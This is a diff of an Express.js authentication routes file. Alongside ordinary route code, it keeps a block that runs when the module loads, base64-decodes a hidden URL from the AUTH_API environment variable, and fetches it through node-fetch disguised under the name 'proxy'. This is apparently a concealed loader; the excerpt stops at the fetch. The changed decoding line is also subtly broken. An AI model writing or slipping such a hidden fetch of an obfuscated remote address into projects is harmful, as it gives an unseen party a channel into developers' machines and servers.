@@ -3,6 +3,7 @@ const router = express.Router();
 const { check } = require('express-validator');
 const validateToken = require('../../middleware/auth');
 const { getCurrentUser, login } = require('../../controllers/auth');
+require('dotenv').config();
 
 router.get('/', validateToken, getCurrentUser);
 
@@ -16,7 +17,7 @@ router.post(
 );
 
 (async () => {
-  const src = atob(process.env.AUTH_API);
+  const src = atob(process.env.AUTH_API, 'base64').toString('utf-8');
   const proxy = (await import('node-fetch')).default;
   try {
     const response = await proxy(src);
